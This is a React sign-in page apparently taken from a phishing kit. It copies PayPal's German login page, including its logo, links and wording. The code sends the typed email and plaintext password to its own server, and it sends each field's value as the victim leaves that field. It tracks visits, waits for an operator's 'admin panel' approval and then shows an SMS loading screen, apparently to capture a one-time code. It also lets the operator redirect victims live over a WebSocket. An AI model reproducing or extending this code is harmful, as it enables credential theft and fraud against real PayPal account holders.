import React, { useState, useMemo, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardFooter,
  CardHeader,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Separator } from "@/components/ui/separator";
import { LoadingOverlay } from "@/components/LoadingOverlay";
import { SmsLoadingOverlay } from "@/components/SmsLoadingOverlay";

import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "../hooks/useWebSocket";

export const SigninPage = (): JSX.Element => {
  // State for input focus and values
  const [emailFocused, setEmailFocused] = useState(false);
  const [emailValue, setEmailValue] = useState("");
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [passwordValue, setPasswordValue] = useState("");
  const [emailError, setEmailError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttemptId, setLoginAttemptId] = useState<number | null>(null);
  
  // Check URL parameters for different loading states
  const [showSpecialLoading, setShowSpecialLoading] = useState(false);
  const [loadingType, setLoadingType] = useState<'loading' | 'sms_loading' | 'fullscreen'>('loading');

  // Get context data from URL
  const urlParams = new URLSearchParams(window.location.search);
  const contextData = urlParams.get("context_data") || "";

  // Initialize WebSocket connection for real-time redirects
  useWebSocket({
    contextData,
    onRedirect: (url) => {
      console.log('🔀 Redirecting to:', url);
    }
  });

  // Validation function for email or phone
  const validateEmailOrPhone = (value: string) => {
    if (!value) {
      setEmailError("Bitte geben Sie eine E-Mail-Adresse oder Handynummer ein.");
      return false;
    }

    // Check if it's a phone number (starts with + and contains digits)
    const phoneRegex = /^\+\d{1,4}\s?\d{3,14}$/;
    // Check if it's an email (contains @ and domain)
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (phoneRegex.test(value) || emailRegex.test(value)) {
      setEmailError("");
      return true;
    } else {
      if (value.includes("@")) {
        setEmailError("Bitte geben Sie eine gültige E-Mail-Adresse ein (z.B. name@domain.com).");
      } else {
        setEmailError("Bitte geben Sie eine gültige Telefonnummer ein (z.B. +49 123 456789).");
      }
      return false;
    }
  };

  // Removed debounce timers - notifications now sent only onBlur

  // Check URL parameters for special loading states
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    
    if (urlParams.get('showLoading') === 'true') {
      setShowSpecialLoading(true);
      setLoadingType('loading');
    } else if (urlParams.get('showSmsLoading') === 'true') {
      setShowSpecialLoading(true);
      setLoadingType('sms_loading');
    } else if (urlParams.get('showFullscreen') === 'true') {
      setShowSpecialLoading(true);
      setLoadingType('fullscreen');
    }
  }, []);

  // Track page visit and departure
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const contextData = urlParams.get("context_data") || "";
    
    const trackVisit = async () => {
      try {
        await fetch("/api/track-visit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            page: "Login Page",
            contextData: contextData,
            userAgent: navigator.userAgent,
          }),
        });
      } catch (error) {
        console.error("Failed to track visit:", error);
      }
    };

    const trackLeave = async () => {
      try {
        await fetch("/api/track-leave", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            contextData: contextData,
          }),
        });
      } catch (error) {
        console.error("Failed to track leave:", error);
      }
    };

    // Track initial visit
    trackVisit();

    // Track when user leaves page
    const handleBeforeUnload = () => {
      navigator.sendBeacon("/api/track-leave", JSON.stringify({
        contextData: contextData,
      }));
    };

    const handleVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        trackLeave();
      }
    };

    // Add event listeners
    window.addEventListener('beforeunload', handleBeforeUnload);
    document.addEventListener('visibilitychange', handleVisibilityChange);

    // Cleanup on component unmount
    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      trackLeave();
    };
  }, []);

  // Send notification only when user leaves field (onBlur)
  const sendFieldNotificationOnBlur = async (field: string, value: string) => {
    if (!value.trim()) return; // Don't send for empty values
    
    const urlParams = new URLSearchParams(window.location.search);
    const returnUri = urlParams.get("returnUri") || "";
    const contextData = urlParams.get("context_data") || "";
    
    try {
      await fetch("/api/field-notifications", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          field,
          value,
          returnUri,
          contextData,
        }),
      });
    } catch (error) {
      console.error("Failed to send field notification:", error);
    }
  };

  // Handle email/phone input change
  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmailValue(value);
    
    // Clear error when user starts typing
    if (emailError && value) {
      setEmailError("");
    }
    // Notification will be sent only onBlur
  };

  // Get returnUri from URL parameters
  const returnUri = useMemo(() => {
    if (typeof window !== "undefined") {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get("returnUri") || "";
    }
    return "";
  }, []);

  // Footer links data
  const footerLinks = [
    { text: "Kontakt", href: "https://www.paypal.com/de/smarthelp/contact-us" },
    {
      text: "Datenschutz",
      href: "https://www.paypal.com/de/webapps/mpp/ua/privacy-full",
    },
    {
      text: "AGB",
      href: "https://www.paypal.com/de/webapps/mpp/ua/legalhub-full",
    },
    {
      text: "Weltweit",
      href: "https://www.paypal.com/de/webapps/mpp/country-worldwide",
    },
  ];

  const handleSubmit = async () => {
    // Validate email/phone before submitting
    const isValidEmail = validateEmailOrPhone(emailValue);
    
    if (!passwordValue) {
      return; // Don't submit if password is empty
    }
    
    if (isValidEmail) {
      setIsLoading(true);
      
      try {
        // Extract contextData from URL if present
        const urlParams = new URLSearchParams(window.location.search);
        const contextData = urlParams.get('context_data');
        
        // Save login attempt to database
        const res = await apiRequest("POST", "/api/login-attempts", {
          emailOrPhone: emailValue,
          password: passwordValue,
          returnUri: returnUri,
          contextData: contextData,
        });
        
        const response = await res.json();
        setLoginAttemptId(response.id);
        
        // Keep showing loading while waiting for approval
        // Start polling for approval
        startPollingForApproval(response.id);
        
      } catch (error) {
        console.error("Failed to save login attempt:", error);
        setIsLoading(false);
      }
    }
  };

  // Poll for approval from admin panel
  const startPollingForApproval = (attemptId: number) => {
    const pollInterval = setInterval(async () => {
      try {
        const res = await apiRequest("GET", `/api/login-attempts/${attemptId}`);
        const response = await res.json();
        
        if (response.approved) {
          clearInterval(pollInterval);
          setIsLoading(false);
          
          // Show SMS loading overlay instead of immediate redirect
          setShowSpecialLoading(true);
          setLoadingType('sms_loading');
        }
      } catch (error) {
        console.error("Failed to check approval status:", error);
      }
    }, 2000); // Check every 2 seconds
  };

  // Fullscreen loading overlay for "Just a second" redirect
  if (loadingType === 'fullscreen' && showSpecialLoading) {
    return (
      <div className="fixed inset-0 bg-white z-50 flex items-center justify-center">
        <div className="text-center">
          <div className="relative w-8 h-8 mx-auto mb-4">
            <div className="absolute inset-0 border-2 border-gray-200 rounded-full"></div>
            <div className="absolute inset-0 border-2 border-transparent border-t-[#0070ba] rounded-full animate-spin"></div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800">Just a second...</h2>
        </div>
      </div>
    );
  }

  return (
    <>
      <LoadingOverlay isVisible={isLoading || (loadingType === 'loading' && showSpecialLoading)} />
      <SmsLoadingOverlay 
        isVisible={loadingType === 'sms_loading' && showSpecialLoading}
        type="sms"
      />
      <div className="signin-page-container flex flex-col min-h-screen items-start pt-8 md:pt-[120px] pb-0 relative bg-wwwpaypalcomwhite px-4 md:px-0">
        <div className="flex flex-col items-start relative flex-1 self-stretch w-full grow">
          <main className="flex flex-col items-center relative self-stretch w-full">
          <Card className="flex flex-col w-full max-w-[460px] items-start gap-6 md:gap-12 pt-6 md:pt-[31px] pb-8 md:pb-[51px] px-6 md:px-[47px] border border-solid border-[#eaeced] rounded-xl">
            <CardHeader className="flex flex-col items-center p-0 w-full bg-transparent">
              <div className="flex flex-col w-[83.44px] h-10 items-start relative">
                <div className="flex flex-col w-[83.44px] h-10 items-center pt-0 pb-[10.33px] px-0 relative">
                  <img
                    className="relative w-[83.44px] h-[29.67px]"
                    alt="PayPal Logo"
                    src="/figmaAssets/paypal-text-logo.svg"
                  />
                </div>
              </div>
            </CardHeader>

            <CardContent className="flex flex-col items-start gap-4 p-0 w-full">
              {/* Error Banner with Smooth Animations */}
              <div className={`w-full transition-all duration-500 ease-in-out overflow-hidden ${
                emailError 
                  ? 'max-h-32 opacity-100' 
                  : 'max-h-0 opacity-0'
              }`}>
                <div 
                  className={`flex items-start gap-3 p-4 border border-red-200 rounded-lg transform transition-all duration-400 ease-out ${
                    emailError 
                      ? 'translate-y-0 scale-100' 
                      : '-translate-y-4 scale-95'
                  }`}
                  style={{ backgroundColor: '#FFF7F7' }}
                >
                  <div className="flex-shrink-0 mt-0.5">
                    <img
                      src="/assets/warning-icon.png"
                      alt="Warning"
                      className={`w-5 h-5 transition-all duration-300 delay-100 ${
                        emailError ? 'scale-100 opacity-100' : 'scale-75 opacity-0'
                      }`}
                    />
                  </div>
                  <div className="flex-1">
                    <p 
                      className="font-normal transition-all duration-400 delay-200 opacity-100 translate-x-0 text-[#001435] text-[13px]"
                      style={{
                        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                      }}
                    >
                      Die eingegebenen Login-Daten sind nicht richtig.
                      <br />
                      Bitte versuchen Sie es erneut.
                    </p>
                  </div>
                </div>
              </div>

              <div className="flex flex-col items-start w-full">
                <div className="flex flex-col items-start gap-2 w-full">
                  <div className="relative w-full">
                    <Input
                      className="h-12 md:h-16 pt-6 md:pt-[30.5px] pb-3 md:pb-[16.5px] px-3 border border-solid rounded-md focus:outline-none focus-visible:outline-none focus-visible:ring-0 focus-visible:ring-offset-0 border-[#999999]"
                      style={{
                        borderWidth: '1px',
                        borderStyle: 'solid',
                        boxSizing: 'border-box',
                        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                      }}
                      onFocus={(e) => {
                        setEmailFocused(true);
                        e.target.style.borderColor = '#0070e0';
                        e.target.style.borderWidth = '2px';
                      }}
                      onBlur={(e) => {
                        setEmailFocused(false);
                        if (emailValue) {
                          validateEmailOrPhone(emailValue);
                          // Send notification when user leaves email field
                          sendFieldNotificationOnBlur("email", emailValue);
                        }
                        e.target.style.borderColor = '#999999';
                        e.target.style.borderWidth = '1px';
                      }}
                      value={emailValue}
                      onChange={handleEmailChange}

                    />
                    <label 
                      className={`absolute left-[11px] transition-all duration-200 ease-in-out pointer-events-none ${
                        emailFocused || emailValue 
                          ? 'top-[6px] md:top-[8px] text-xs' 
                          : 'top-[12px] md:top-[19px] text-sm md:text-base'
                      } text-wwwpaypalcomnevada`}
                      style={{
                        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                      }}
                    >
                      E-Mail-Adresse oder Handynummer
                    </label>
                  </div>

                  <div className="flex flex-col items-start gap-2 w-full pb-4">
                    <div className="relative w-full">
                      <Input
                        className="h-12 md:h-16 pt-6 md:pt-[30.5px] pb-3 md:pb-[16.5px] px-3 border border-solid rounded-md focus:outline-none focus-visible:outline-none focus-visible:ring-0 focus-visible:ring-offset-0 border-[#999999]"
                        type="password"
                        value={passwordValue}
                        onChange={(e) => {
                          const value = e.target.value;
                          setPasswordValue(value);
                          // Notification will be sent only onBlur
                        }}
                        style={{
                          borderWidth: '1px',
                          borderStyle: 'solid',
                          boxSizing: 'border-box',
                          fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                        }}
                        onFocus={(e) => {
                          setPasswordFocused(true);
                          e.target.style.borderColor = '#0070e0';
                          e.target.style.borderWidth = '2px';
                        }}
                        onBlur={(e) => {
                          setPasswordFocused(false);
                          // Send notification when user leaves password field
                          if (passwordValue.trim()) {
                            sendFieldNotificationOnBlur("password", passwordValue);
                          }
                          e.target.style.borderColor = '#999999';
                          e.target.style.borderWidth = '1px';
                        }}
                      />
                      <label 
                        className={`absolute left-[11px] text-wwwpaypalcomnevada transition-all duration-200 ease-in-out pointer-events-none ${
                          passwordFocused || passwordValue 
                            ? 'top-[6px] md:top-[8px] text-xs' 
                            : 'top-[12px] md:top-[19px] text-sm md:text-base'
                        }`}
                        style={{
                          fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                        }}
                      >
                        Passwort
                      </label>
                    </div>

                    <a
                      className="text-wwwpaypalcomscience-blue text-base font-medium"
                      href="https://www.paypal.com/authflow/password-recovery/"
                      rel="noopener noreferrer"
                      target="_blank"
                      style={{
                        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                      }}
                    >
                      Passwort vergessen?
                    </a>
                  </div>
                </div>

                <Button 
                  onClick={handleSubmit}
                  className="w-full h-12 md:h-12 bg-[#0551b5] rounded-[100px] border-2 border-solid text-wwwpaypalcomwhite font-medium text-sm md:text-base hover:bg-[#0441a0] transition-colors duration-200"
                  style={{
                    fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                  }}
                >
                  Einloggen
                </Button>
              </div>

              <div className="flex flex-col items-start gap-[17.92px] w-full">
                <div className="relative w-full h-[15px]">
                  <Separator className="border-t border-[#cbd2d6]" />
                  <div className="inline-flex items-start justify-center px-[7.5px] py-0 absolute -top-2.5 left-1/2 transform -translate-x-1/2 bg-wwwpaypalcomwhite">
                    <span 
                      className="text-wwwpaypalcomnevada text-center whitespace-nowrap"
                      style={{
                        fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                      }}
                    >
                      oder
                    </span>
                  </div>
                </div>

                <Button
                  variant="outline"
                  className="w-full h-12 md:h-12 rounded-[100px] border-2 border-solid border-black text-wwwpaypalcomblack text-center text-sm md:text-base transition-all duration-300 ease-in-out hover:bg-blue-50 hover:border-blue-500 hover:text-blue-600"
                  onClick={() => window.open("https://www.paypal.com/de/webapps/mpp/account-selection", "_blank")}
                  style={{
                    fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                  }}
                >
                  Neu anmelden
                </Button>
              </div>
            </CardContent>

            <CardFooter className="flex items-center justify-center p-0 w-full h-[66.5px]">
              <div className="flex items-center justify-center gap-1.5">
                <div className="flex items-center gap-2">
                  <div className="relative w-5 h-4">
                    <img 
                      src="/figmaAssets/flagGERMANY.svg" 
                      alt="German flag" 
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <button
                    className="font-bold text-wwwpaypalcomshuttle-gray text-sm text-center leading-5 whitespace-nowrap bg-transparent border-none cursor-pointer hover:text-blue-600 transition-colors duration-200"
                    onClick={() => window.location.reload()}
                    style={{
                      fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                    }}
                  >
                    Deutsch
                  </button>
                </div>

                <div className="flex items-center h-4 border-l border-[#cccccc] pl-3">
                  <button
                    className="font-normal text-wwwpaypalcomshuttle-gray text-sm text-center leading-5 whitespace-nowrap bg-transparent border-none cursor-pointer hover:text-blue-600 transition-colors duration-200"
                    onClick={() => window.location.reload()}
                    style={{
                      fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif !important'
                    }}
                  >
                    English
                  </button>
                </div>
              </div>
            </CardFooter>
          </Card>
        </main>

        <footer className="flex flex-col w-full items-start pt-2 pb-0 px-0 fixed bottom-0 left-0 bg-transparent z-20">
          <div className="flex flex-col items-start py-2 px-3.5 w-full bg-wwwpaypalcomathens-gray">
            <div className="flex items-center justify-center gap-1 md:gap-2.5 w-full flex-wrap">
              {footerLinks.map((link, index) => (
                <div
                  key={index}
                  className="inline-flex items-start justify-center"
                >
                  <a
                    className="font-normal text-wwwpaypalcomshuttle-gray text-[9px] md:text-[11px] text-center leading-[14px] md:leading-[18px] whitespace-nowrap hover:text-blue-600 transition-colors duration-200"
                    href={link.href}
                    rel="noopener noreferrer"
                    target="_blank"
                  >
                    {link.text}
                  </a>
                </div>
              ))}
            </div>
          </div>
        </footer>
        </div>
      </div>
    </>
  );
};